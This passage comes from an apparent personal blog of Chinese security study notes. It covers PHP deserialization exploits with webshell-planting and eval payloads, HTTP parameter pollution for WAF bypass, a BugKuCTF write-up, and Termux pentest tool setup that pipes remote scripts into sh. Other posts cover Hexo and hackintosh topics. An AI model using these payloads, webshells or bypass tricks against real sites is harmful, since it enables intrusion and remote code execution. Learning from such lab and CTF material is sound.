class="string">""</span>;&#125;</span><br></pre></td></tr></table></figure><p>s:33:&quot;&quot;里面没有payload我们自己写进去:</p><p><strong>tips:与target=里面的?&gt;&quot;发生了冲突，还未找到解决方案</strong></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">O:<span class="number">7</span>:<span class="string">"payload"</span>:<span class="number">1</span>:&#123;s:<span class="number">4</span>:<span class="string">"test"</span>;s:<span class="number">33</span>:<span class="string">"&lt;?php $a=$_GET[cmd];system($a);?&gt;"</span>;&#125;</span><br></pre></td></tr></table></figure><p><img src="fangxuliehua5.jpg" alt="反序列化漏洞"></p><p>执行成功！</p><h3 id="其他Magic-function的利用">其他Magic function的利用</h3><p>但如果一次unserialize()中并不会直接调用的魔术函数，比如前面提到的__construct()，是不是就没有利用价值呢？并不是。然而类似于PWN中的ROP，有时候反序列化一个对象时，由它调用的__wakeup()中又去调用了其他的对象，由此可以溯源而上，利用一次次的“gadget”找到漏洞点。</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">fangxuliehua_1</span></span>&#123;</span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">__construct</span><span class="params">($test)</span></span>&#123;</span><br><span class="line"> $fp = fopen(<span class="string">"webshell.php"</span>,<span class="string">"w"</span>) ;</span><br><span class="line">        fwrite($fp,<span class="keyword">$this</span>-&gt;test);</span><br><span class="line">        fclose($fp);</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">fangxuliehua_2</span></span>&#123;</span><br><span class="line"><span class="keyword">public</span> $test=<span class="string">'test'</span>;</span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">__wakeup</span><span class="params">()</span></span>&#123;</span><br><span class="line">     $obj=<span class="keyword">new</span> fangxuliehua_1(<span class="keyword">$this</span>-&gt;test);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">$class_get = $_GET[<span class="string">'test'</span>];</span><br><span class="line">print_r($class_get);</span><br><span class="line"><span class="keyword">echo</span> <span class="string">"&lt;/br&gt;"</span>;</span><br><span class="line">$class_get_unser = unserialize($class_get);</span><br><span class="line"></span><br><span class="line"><span class="keyword">include_once</span>(<span class="string">"webshell.php"</span>);<span class="comment">//包含一下，让它能显示效果</span></span><br></pre></td></tr></table></figure><p>这里我们给test传入构造好的序列化字符串后，进行反序列化时自动调用 __wakeup()函数，从而在new fangxuliehua_1()会自动调用对象fangxuliehua_1中的__construct()方法，从而把<code>&lt;?php phpinfo() ?&gt;</code>写入到 webshell.php中。</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">O:<span class="number">14</span>:<span class="string">"fangxuliehua_2"</span>:<span class="number">1</span>:&#123;s:<span class="number">4</span>:<span class="string">"test"</span>;s:<span class="number">18</span>:<span class="string">"&lt;?php%20phpinfo();?&gt;"</span>;&#125;</span><br></pre></td></tr></table></figure><p><img src="fangxuliehua6.jpg" alt="调用wakeup"></p><h1 id="0x04-利用普通成员方法">0x04 利用普通成员方法</h1><p>前面谈到的利用都是基于“自动调用”的magic function。但当漏洞/危险代码存在类的普通方法中，就不能指望通过“自动调用”来达到目的了。这时的利用方法如下，寻找相同的函数名，把敏感函数和类联系在一起。</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">itishead</span></span>&#123;</span><br><span class="line"><span class="keyword">public</span> $test;</span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">__construct</span><span class="params">()</span></span>&#123;</span><br><span class="line"><span class="keyword">$this</span>-&gt;test= <span class="keyword">new</span> itisbody();</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">__destruct</span><span class="params">()</span></span>&#123;</span><br><span class="line"><span class="keyword">$this</span>-&gt;test-&gt;action();</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">itisbody</span></span>&#123;</span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">action</span><span class="params">()</span></span>&#123;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">"hereisbody:)"</span>;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">itisfoot</span></span>&#123;</span><br><span class="line"><span class="keyword">public</span> $test2;</span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">action</span><span class="params">()</span></span>&#123;</span><br><span class="line"><span class="keyword">eval</span>(<span class="keyword">$this</span>-&gt;test2);</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">$class = <span class="keyword">new</span> itishead();</span><br><span class="line">unserialize($_GET[<span class="string">'test'</span>]);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>本意上，new一个新的itishead对象后，调用_construct()，其中又new了itisbody对象。在结束后会调用__destruct()，其中会调用action()，从而输出 itisbody。</p><p>利用代码:</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">itishead</span> </span>&#123;</span><br><span class="line">    <span class="keyword">var</span> $test;</span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__construct</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;test = <span class="keyword">new</span> itisfoot();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">itisfoot</span> </span>&#123;</span><br><span class="line">    <span class="keyword">var</span> $test2 = <span class="string">"phpinfo();"</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">echo</span> serialize(<span class="keyword">new</span> itishead());</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>生成：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">O:<span class="number">8</span>:<span class="string">"itishead"</span>:<span class="number">1</span>:&#123;s:<span class="number">4</span>:<span class="string">"test"</span>;O:<span class="number">8</span>:<span class="string">"itisfoot"</span>:<span class="number">1</span>:&#123;s:<span class="number">5</span>:<span class="string">"test2"</span>;s:<span class="number">10</span>:<span class="string">"phpinfo();"</span>;&#125;&#125;</span><br></pre></td></tr></table></figure><p>把payload传进去:</p><p><img src="fangxuliehua7.jpg" alt="利用成功截图"></p><p>利用成功！</p><blockquote><p>参考链接:<a href="https://chybeta.github.io/2017/06/17/%E6%B5%85%E8%B0%88php%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E/" target="_blank" rel="noopener">https://chybeta.github.io/2017/06/17/%E6%B5%85%E8%B0%88php%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E/</a></p></blockquote><p><strong>转载请标明出处</strong></p>]]></content>
      
      
      <categories>
          
          <category> Note </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Note </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>浅谈经典漏洞HTTP参数污染</title>
      <link href="/2019/09/24/http%E5%8F%82%E6%95%B0%E6%B1%A1%E6%9F%93/"/>
      <url>/2019/09/24/http%E5%8F%82%E6%95%B0%E6%B1%A1%E6%9F%93/</url>
      
        <content type="html"><![CDATA[<h1 id="0x00-问题由来">0x00 问题由来</h1><p>在先知社区看到一篇文章，从<strong>HTTP参数污染</strong>达成sql注入。</p><p>有点不理解HTTP参数污染是什么，于是就去翻了一些资料和看了视频过来总结一下。</p><h1 id="0x01-什么是HTTP常数污染">0x01 什么是HTTP常数污染</h1><p>HTTP参数污染，简单的来说就是给一个参数附上两个或者两个以上的value。对于不同的引擎引用的value会不同。</p><p><strong>假设:</strong></p><p>如果是jsp+tomcat 返回的请求是第一个value，</p><p>如果php+apache 返回的请求是第二个value，</p><p>如果是asp+iis 则会返回两个一起的value</p><h1 id="0x02-一些例子">0x02 一些例子</h1><h3 id="1-假设我们有一个网站http-hacker-net">1.假设我们有一个网站http://hacker.net/</h3><p><a href="http://hacker.net/search.php?page=10&amp;page=hacker" target="_blank" rel="noopener">http://hacker.net/search.php?page=10&amp;page=hacker</a></p><p>当服务器遇到同一个参数赋值不同数值时，会将他们连接起来，hacker可以通过这个方法来绕过黑名单例如</p><p><a href="http://hacker.net/search.php?page=select" target="_blank" rel="noopener">http://hacker.net/search.php?page=select</a> 1&amp;page=2,3,database()</p><p>不是在黑名单中的模式，不会触发黑名单的拦截功能，其次，由于web程序会采取连接操作，将前后的内容连接起来，SQL注入行为才能够被执行</p><h1 id="0x03-注入和HTTP参数污染有什么关系">0x03 注入和HTTP参数污染有什么关系</h1><p>如果该网站是采用两个一起的value一起返回，则可以用于Bypass WAF，也可以用于XSS.</p><p>最终取决于web服务器</p><h1 id="0x04-结尾">0x04 结尾</h1><p>经典的漏洞不代表现在没有，可以结合一些payload来达成过WAF。</p><p>tips:有点小乱。我看了也有点迷茫了xD</p><blockquote><p><strong>参考链接</strong>:<a href="https://v.qq.com/x/page/k0870cdqlsb.html" target="_blank" rel="noopener">https://v.qq.com/x/page/k0870cdqlsb.html</a></p></blockquote><p><strong>转载请标明出处</strong></p>]]></content>
      
      
      <categories>
          
          <category> Note </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Note </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Hexo插入图片问题的总结</title>
      <link href="/2019/09/18/Hexo%E6%8F%92%E5%85%A5%E5%9B%BE%E7%89%87%E9%97%AE%E9%A2%98%E7%9A%84%E6%80%BB%E7%BB%93/"/>
      <url>/2019/09/18/Hexo%E6%8F%92%E5%85%A5%E5%9B%BE%E7%89%87%E9%97%AE%E9%A2%98%E7%9A%84%E6%80%BB%E7%BB%93/</url>
      
        <content type="html"><![CDATA[<h1 id="0x00-起因">0x00 起因:</h1><p>插入图片的时候hexo-asset-image 插件会在图片的路径前面自动添加/.io/</p><p><img src="io.png" alt="1"></p><h1 id="0x01-经过了一系列的测试找出了一下几个问题">0x01 经过了一系列的测试找出了一下几个问题:</h1><ul><li><p><strong>问题1</strong></p><p>Hexo版本以及插件不是最新</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">hexo v</span><br></pre></td></tr></table></figure></li><li><p><strong>问题2</strong></p><p>没有用<code>hexo n &quot;string&quot;</code> 新增文章。</p></li><li><p><strong>问题3</strong></p><p>图片路径的**<code>斜杆</code>**问题 (<code>/</code>)正斜杆和( <code>\</code>)反斜杆,</p><p>如果图片是直接脱进Makedown，它会写路径的是反斜杆</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">![]xx\xx.png</span><br></pre></td></tr></table></figure><p>会让hexo-asset-image插件 自动识别成，加一个名字</p><p>正常的：BugKuCTF/xx.png</p><p>错误的：BugKuCTF/BugKuCTFxx.png</p><p><img src="hexo.PNG" alt></p></li></ul><p>红色 是错的</p><p>蓝色 是对的</p><ul><li><p><strong>问题4</strong></p><p>如果在旧版本的Hexo安装过，hexo-asset-image 插件</p><p>那就需要重装一遍</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">npm remove hexo-asset-image</span><br><span class="line">npm install hexo-asset-image --save</span><br></pre></td></tr></table></figure></li><li><p><strong>问题5</strong></p><p>这个问题我不知道是不是所有人都会。在makedown下，不区分路径大小写，在hexo上传后网页上区分大小写</p><p><img src="1.PNG" alt></p><h1 id="0x02-最直接最接地气解决问题的办法">0x02 最直接最接地气解决问题的办法</h1><p>就是去修改插件源代码</p><p>位置: node_modules\hexo-asset-image\index.js</p></li></ul><p><strong>tips: 这是我个人博客hexo插入图片时出错的问题,我用的Makedown是Typora，不同的主题有不一样的渲染图片路径的方式，根据不同的方式去修改插件代码。有能力可以自己写插件=w=</strong></p><p><strong>转载请标明出处</strong></p>]]></content>
      
      
      <categories>
          
          <category> Note </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Note </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Python脚本:搜索本地NAS</title>
      <link href="/2019/06/20/%E6%9C%AC%E5%9C%B0NAS%E6%89%AB%E6%8F%8F/"/>
      <url>/2019/06/20/%E6%9C%AC%E5%9C%B0NAS%E6%89%AB%E6%8F%8F/</url>
      
        <content type="html"><![CDATA[<h1 id="0x00-介绍">0x00 介绍</h1><p>每次都会折腾一下实训室的 软路由。不是换linux就是坏掉机子，偶尔还忘记NAS配的固定IP。</p><p>所以写下了查找本地NAS脚本。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> socket</span><br><span class="line"><span class="keyword">import</span> re</span><br><span class="line"><span class="keyword">import</span> threading</span><br><span class="line"></span><br><span class="line">print(<span class="string">"""</span></span><br><span class="line"><span class="string">[搜索本地NAS-Version 0.1]\n默认扫描最后一个网段1.1.1./24</span></span><br><span class="line"><span class="string">"""</span>)</span><br><span class="line">host = input(<span class="string">"本地IP&gt;"</span>)</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">searchNAS</span><span class="params">(i)</span>:</span></span><br><span class="line">    ip = host+str(i)</span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        Hostname = socket.gethostbyaddr(ip)</span><br><span class="line">        match = re.search(<span class="string">r'NAS-SERVER'</span>,str(Hostname)).group()</span><br><span class="line">        <span class="keyword">if</span> match == <span class="string">"NAS-SERVER"</span>:</span><br><span class="line">            print(<span class="string">"NAS服务器IP地址为 &gt; &#123;&#125;:&#123;&#125;"</span>.format(match,ip))</span><br><span class="line">            <span class="keyword">pass</span></span><br><span class="line">    <span class="keyword">except</span>:</span><br><span class="line">        <span class="keyword">pass</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">0</span>,<span class="number">256</span>):</span><br><span class="line">    t = threading.Thread(target=searchNAS,args=(i, ))</span><br><span class="line">    t.start()</span><br></pre></td></tr></table></figure><p>局域网内是DHCP会每天会更换IP，所以我打算就做了一个本地NAS的ip搜索器。方便自己找到存储服务器😗</p><p><strong>转载请标明出处</strong></p>]]></content>
      
      
      <categories>
          
          <category> Python </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Python </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>【BugKuCTF】靶场部分writeup</title>
      <link href="/2019/05/20/BugKuCTF/"/>
      <url>/2019/05/20/BugKuCTF/</url>
      
        <content type="html"><![CDATA[<h1 id="0x00-介绍">0x00 介绍</h1><p>开始做一些CTF题目了。打算在高职比赛玩玩CTFxD</p><p>地址:<a href="https://ctf.bugku.com/challenges" target="_blank" rel="noopener">https://ctf.bugku.com/challenges</a></p><ul><li><h3 id="WEB篇"><strong>WEB篇</strong></h3><h4 id="web2">[<code>web2</code>]</h4><p>这种类型直接看源码 F12或者Ctrl+U</p><p><img src="web2.PNG" alt></p></li></ul><h4 id="计算器">[<code>计算器</code>]------------------------------------------------------</h4><p>试着算出来,然后发现只能输入一位数，就能猜测到他限制了长度，接着我们跑到F12里面去修改即可</p><p><img src="%E8%AE%A1%E7%AE%97%E5%99%A81.png" alt="计算器1"></p><p><img src="%E8%AE%A1%E7%AE%97%E5%99%A82.PNG" alt="计算器2"></p><h4 id="web基础-GET">[<code>web基础$_GET</code>]------------------------------------------------------</h4><p>不解释，直接看代码</p><p><img src="$GET.PNG" alt="$GET"></p><p><img src="$get1.PNG" alt="$get1"></p><h4 id="web基础-POST">[<code>web基础$_POST</code>]------------------------------------------------------</h4><p>也不解释，直接看代码，需要用到抓包软件</p><p><img src="$POST.PNG" alt="$POST"></p><h4 id="矛盾">[<code>矛盾</code>]------------------------------------------------------</h4><p>先看代码</p><p><img src="%E7%9F%9B%E7%9B%BE.PNG" alt="矛盾"></p><p>问题出现在 <code>is_numeric</code> 这个函数,<code>is_numeric</code> 是判断 传入的字符串是否为数字。如果是则不输出,不是则输出<code>$num</code>。这个时候我们可以绕过这个函数。</p><p>他判断的是数字那么我们给他加点字符串 <code>?num=1a</code>，则绕过了第一个<code>if</code>判断，并跳到了第二个<code>if</code>判断。</p><p>然后他现在直接显示出了flag.</p><p><img src="%E7%9F%9B%E7%9B%BE2.PNG" alt="矛盾2"></p><h4 id="web3">[<code>web3</code>]---------------------------------------------------</h4><p>他会一直弹窗出来。不知道为什么我的Chrome不会跳出来。</p><p><img src="web3.png" alt="web3"></p><p>接着我们直接看源码F12  或者 Ctrl+U，发现最下面有一个被注释的html编码</p><p><img src="web3-1.PNG" alt="web3-1"></p><p>我的方法是，编写到文本，换html格式打开。</p><p><img src="web3-2.PNG" alt="web3-2"></p><p>解码就出来了.</p><h4 id="域名解析">[<code>域名解析</code>]-------------------------------------------------</h4><p><img src="%E5%9F%9F%E5%90%8D%E8%A7%A3%E6%9E%90.PNG" alt="域名解析"></p><p>修改hosts访问 flag.baidu.com即可.</p><ul><li><p>hosts位置</p><p>windows：</p><p>C:\Windows\System32\drivers\etc</p><p>linux:</p><p>/etc/hosts</p></li></ul><h4 id="你必须让他停下来">[<code>你必须让他停下来</code>]--------------------------------------------</h4><p>打开网址发现他一直刷新。二话不说直接上Burpsuite抓包，并放到Repeater(Ctrl+R)。</p><p>多Go几遍就能看到flag了</p><p><img src="%E5%81%9C%E4%B8%8B%E6%9D%A5.PNG" alt="停下来"></p><h4 id="本地文件包含">[<code>本地文件包含</code>]--------------------------------------------------</h4><p><strong>网站进不去。放弃.</strong></p><h4 id="变量1">[<code>变量1</code>]------------------------------------------------------</h4><p>先看审计代码，发现最下面有两个$$args</p><p><img src="%E5%8F%98%E9%87%8F1.PNG" alt="变量1"></p><p>$$   容易引发变量覆盖</p><p>思考。我们直接让他全部值显示出来。使用全局变量<code>$GLOBALS</code></p><p>我们直接给他 全局变量<code>$GLOBALS</code>传参进去,args=GLOBALS</p><p>tips:关于全局变量https://www.runoob.com/php/php-superglobals.html</p><p><img src="%E5%8F%98%E9%87%8F1-2.PNG" alt="变量1-2"></p><h4 id="web5">[<code>web5</code>]----------------------------------------------------</h4><p>输入字符串,啥东西都没有</p><p><img src="web5.PNG" alt="web5"></p><p>直接看看源码F12 或者 Ctrl+U</p><p><img src="web5-1.PNG" alt="web5-1"></p><p>发现这一串看不懂的编码。这种编码是JSFUCK属于一直 加密方式</p><p>tips:原理<a href="https://blog.csdn.net/qq_36539075/article/details/79946099" target="_blank" rel="noopener">https://blog.csdn.net/qq_36539075/article/details/79946099</a></p><p>直接F12在Console里粘贴</p><p><img src="web5-2.PNG" alt="web5-2"></p><h4 id="头等舱">[<code>头等舱</code>]------------------------------------------------------</h4><p>什么也没有。</p><p><img src="%E5%A4%B4%E7%AD%89%E8%88%B1.PNG" alt="头等舱"></p><p>在看下头等舱。就能猜测到他flag肯定在 请求头那边，于是直接上抓包软件，并GO一遍看看</p><p><img src="%E5%A4%B4%E7%AD%89%E8%88%B11.PNG" alt="头等舱1"></p><p>拿到flag！</p><h4 id="网站被黑">[<code>网站被黑</code>]------------------------------------------------------</h4><p>打开网站。好炫啊。还会跟着鼠标动，好！偷代码下来了</p><p><img src="webshell1.PNG" alt="webshell1"></p><p>啥也没提示。直接上御剑扫描找到一个。<strong>shell的路径</strong> 123.206.87.240:8002/webshell/shell.php</p><p><img src="webshell2.PNG" alt="webshell2"></p><p>二话不说直接上爆破Burp Suite</p><p><img src="webshell3.PNG" alt="webshell3"></p><p>输入上去</p><p><img src="20180813135625263.png" alt="20180813135625263"></p><p>GET到flag</p><h4 id="管理员系统"><strong>[<code>管理员系统</code>]------------------------------------------------------</strong></h4><p>打开发现是一个登入界面。尝试使用SQL万能密码登入</p><p><img src="%E6%8D%95%E8%8E%B7.PNG" alt="捕获"></p><p>失败了。IP被禁止访问。</p><p><img src="%E6%8D%95%E8%8E%B71.PNG" alt="捕获1"></p><p>于是打开抓包软件在请求头上添加上**<code>X-Forwarded-For 127.0.0.1</code>**</p><p>再试试万能密码</p><p><img src="%E6%8D%95%E8%8E%B72.PNG" alt="捕获2"></p><p>密码错误。那么我们来看看源码F12</p><p><img src="%E6%8D%95%E8%8E%B73.PNG" alt="捕获3"></p><p>看到源码中有一个被注释的base64的编码。于是解密出来看是<strong>test123</strong>那么用户名是**<code>admin</code><strong>密码是</strong><code>test123</code>**</p><p><strong>tips:不定时更新。每更新十个题目</strong></p>]]></content>
      
      
      <categories>
          
          <category> CTF-Web-Note </category>
          
      </categories>
      
      
        <tags>
            
            <tag> CTF-Web-Note </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Termux安装笔记</title>
      <link href="/2019/02/02/Termux%E5%AE%89%E8%A3%85/"/>
      <url>/2019/02/02/Termux%E5%AE%89%E8%A3%85/</url>
      
        <content type="html"><![CDATA[<h1 id="0x00-介绍">0x00 介绍</h1><p>为了方便,随时随地能做渗透测试又安装不了NetHuter的时候做出来的整理。也为了方便我自己以后刷系统能在安装回来，写写笔记</p><ul><li><p><strong>科学上网</strong></p><ol><li><p>在Github上搜索ShadowsocksR</p><p>(<a href="https://github.com/shadowsocksr-backup/shadowsocksr-android/releases" target="_blank" rel="noopener">https://github.com/shadowsocksr-backup/shadowsocksr-android/releases</a>)</p></li><li><p>赛风</p></li></ol></li><li><p><strong>Termux下载地址</strong></p><ol><li>Google商城(要借助科学上网)</li><li>酷安</li></ol></li><li><p><strong>Termux更改源</strong></p><ul><li><p>自动更换指令</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sed -i 's@^\(deb.*stable main\)$@#\1\ndeb https://mirrors.tuna.tsinghua.edu.cn/termux stable main@' $PREFIX/etc/apt/sources.list</span><br></pre></td></tr></table></figure></li><li><p>手动修改</p><p>​编辑 <code>$PREFIX/etc/apt/sources.list</code> 修改为如下内容</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#</span><span class="bash"> The termux repository mirror from TUNA:</span></span><br><span class="line">deb https://mirrors.tuna.tsinghua.edu.cn/termux stable main</span><br></pre></td></tr></table></figure></li></ul><p>并更新pkg up / apt update</p><p>两种方法安装metasploit</p></li><li><p><strong>两种方法安装metasploit</strong></p><ul><li>第一种</li></ul><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">pkg install metasploit</span><br></pre></td></tr></table></figure><p><strong>一路默认安装</strong></p><ul><li><p>第二种</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">apt install wget</span><br><span class="line">wget https://Auxilus.github.io/metasploit.sh</span><br><span class="line">sh metasploit.sh</span><br><span class="line">pkg install metasploit</span><br></pre></td></tr></table></figure></li></ul><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"> </span><br></pre></td></tr></table></figure></li><li><p><strong>Termux安装一些Python必要的库</strong></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">pkg install python python-dev python2 python2-dev</span><br></pre></td></tr></table></figure></li><li><p><strong>Termux安装一些常用的辅助工具</strong></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">pkg install git curl</span><br></pre></td></tr></table></figure></li><li><p><strong>美化Termux</strong></p><ul><li><p>oh-my-zsh的安装</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sh -c <span class="string">"<span class="variable">$(curl -fsSL https://github.com/Cabbagec/termux-ohmyzsh/raw/master/install.sh)</span>"</span></span><br></pre></td></tr></table></figure><p>一步到位，后面自己选择主题和颜色</p></li></ul></li><li><p><strong>Termux安装nmap</strong></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">pkg install nmap</span><br></pre></td></tr></table></figure></li><li><p><strong>Termux安装SQLMap</strong></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">apt install python2 git</span><br><span class="line">git <span class="built_in">clone</span> https://github.com/sqlmapproject/sqlmap</span><br></pre></td></tr></table></figure></li></ul><p><strong>转载请标明出处</strong></p>]]></content>
      
      
      <categories>
          
          <category> Note </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Note </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>【转载】黑苹果安装笔记</title>
      <link href="/2018/12/15/BlackApple/"/>
      <url>/2018/12/15/BlackApple/</url>
      
        <content type="html"><![CDATA[<h2>上个星期装的双系统,win10 & MACOS,还把之前的win10搞崩了。害的我只能重装win10</h2>我要总结的转载的简书都。。帮我一起总结了，所以我就懒的写了 嘻嘻<pre><code>        要点:        1、两系统共存则磁盘必须是GPT格式        2、安装mac要用适合机型的EFI文件和相应的安装配置，特别是显卡驱动&lt;br&gt;        3、安装完以后要把mac和win完整的EFI文件合并到一起并且放入电脑安装时自动分好的EFI分区内&lt;br&gt;        4 、用clover挂载好所有的电脑内EFI引导文件（即mac 和 win的）        简略步骤:        远景：从GPT(GUID) 分区开始,EasyUEFI 双系统安装详解(install.wim + mac10.12.5)这是win7+mac10.12的帖子，比较复杂，可以看看，了解EFI分区。win10+mac10.12 直接看12楼的回复就可以了&lt;br&gt;        分区：PE下分一个ESP ，二个NT&lt;br&gt;        安装MAC：u盘安装        安装win10：PE下安装WIN的WIM镜像，在软件里选对系统分区，启动分区，引导类型        EFI引导：装好WIN后，COPY CLOVER进ESP，就完事了        把Mac efi里面CLOVER文件夹放到esp分区的efi文件夹里，然后用easyuefi添加EFI/CLOVER/CLOVERX64.efi引导        在此之前需要的准备：        硬件方面：        一台i7-7700k + Gigabyte Z270X-Gaming5 台式机        最好有一台可用的mac        2个以上空的8G或以上的U盘        软件方面：        准备好mac 10.11.3镜象        准备好在win上制作mac镜象的工具：transmac(自行百度）或者mac上制作mac镜像的工具：Unibeast        准备好在mac上挂载EFI分区的工具：Clover Configurator       BIOS设置：        启动方式：UEFI        硬盘模式：ACHI        家伙事准备得差不多了我们就可以开始了。        一、首先制作mac系统安装盘        1 win系统：在win里下载好mac 10.12系统并安装好transmac        2 Mac 系统：下载macOS Sierra 10.12 并安装Unibeast，制作mac安装盘        二、制作win10系统安装盘        三、安装mac，我们要实现mac和win10同时存在，并要双引导，所以必须要uefi引导方式，而win10要uefi引导就必须装在GPT格式的磁盘上，所以，首先，必须将磁盘设置为GPT格式，所以先用win10的系统盘插入电脑，开机，进入安装界面，在选择装在哪个盘的时候点击shift F10，然后在dos里操作，具体操作不再此说明       设置磁盘格式为GPT以后，退出windows安装，我们先还是安装mac 的，把我们做好的mac系统盘插入电脑，开机，按F7，用U盘引导，选择install OS X EI Capitan,按照提示一步一步安装完成即可，大概20-25分钟，取决于你的U盘速度。这里有个分区的问题，你想给mac多少空间，就多少，其它的不用创建分区，等windows创建即可，我128固态给mac40G。之后mac安装完成        四、安装完成后，关机，插入 